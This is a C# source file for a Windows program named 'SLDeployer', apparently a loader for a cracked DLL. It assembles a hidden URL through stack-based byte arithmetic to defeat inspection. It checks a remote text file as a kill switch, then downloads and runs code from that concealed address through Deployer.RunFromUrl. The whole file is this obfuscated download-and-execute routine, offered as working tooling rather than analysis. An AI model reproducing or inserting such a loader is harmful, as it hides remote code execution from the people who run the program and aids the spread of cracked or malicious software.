using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace DCT.Deployment
{
    internal class SLDeployer
    {
        [STAThread]
        private static void Main()
        {
            // --> to slcrack.dll
            Stack<int> stack = new Stack<int>(41);
            int bCrypt = 0;

            bCrypt = StackDecrypt(bCrypt, 2, 0x6C);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 0, 0x0);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 1, 0xF8);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 0, 0x36);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 0, 0xC3);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 2, 0x8);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 2, 0x2);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 0, 0xEF);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 0, 0xF);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 0, 0xF7);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 0, 0xF9);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 0, 0x44);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 2, 0x43);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 0, 0xF9);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 2, 0x17);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 0, 0xFF);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 1, 0x6);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 1, 0xF8);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 0, 0x2);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 0, 0xEF);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 0, 0xF);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 2, 0x4C);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 2, 0x42);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 0, 0xFE);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 1, 0xF4);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 2, 0x4D);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 2, 0x5D);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 0, 0x11);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 2, 0x7);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 0, 0xEE);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 2, 0x12);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 1, 0x0);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 1, 0xD);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 1, 0xF4);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 2, 0x49);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 1, 0x0);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 1, 0xB);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 0, 0xCA);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 1, 0x4);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 2, 0x0);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 0, 0xC);
            stack.Push(bCrypt);

            StringBuilder sb = new StringBuilder();
            while (stack.Count > 0)
            {
                sb.Append((char)stack.Pop());
            }

            string nothing = "It should be really easy to crack this part, but you're missing the point...";
            WebClient c = new WebClient();
            Stream s = c.OpenRead(sb.ToString() + ".txt");
            TextReader r = new StreamReader(s);
            string status = r.ReadToEnd();
            if (status != "go")
            {
                MessageBox.Show("Usage has been deactivated", "Not Starting", MessageBoxButtons.OK, MessageBoxIcon.Stop);
                Application.Exit();
                return;
            }

            stack = new Stack<int>(3);
            bCrypt = 0;

            bCrypt = StackDecrypt(bCrypt, 0, 0xBB);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 0, 0x17);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 0, 0xED);
            stack.Push(bCrypt);

            StringBuilder sb2 = new StringBuilder();
            while (stack.Count > 0)
            {
                sb2.Append((char)stack.Pop());
            }

            MessageBox.Show("Beware: this program is a piece of shit, so after you're done using it you will have to exit it in task manager (ctrl alt backspace or ctrl alt delete).", "Notice", MessageBoxButtons.OK, MessageBoxIcon.Information);
            Deployer.RunFromUrl(sb.ToString(), sb2.ToString());
        }

        private static int StackDecrypt(int bCrypt, int iOpCode, int iSalt)
        {
            switch (iOpCode)
            {
                case 0:
                    bCrypt = bCrypt - iSalt;
                    break;
                case 1:
                    bCrypt = bCrypt + iSalt;
                    break;
                case 2:
                    bCrypt = bCrypt ^ iSalt;
                    break;
            }
            bCrypt = bCrypt & 255;
            return bCrypt;
        }
    }
}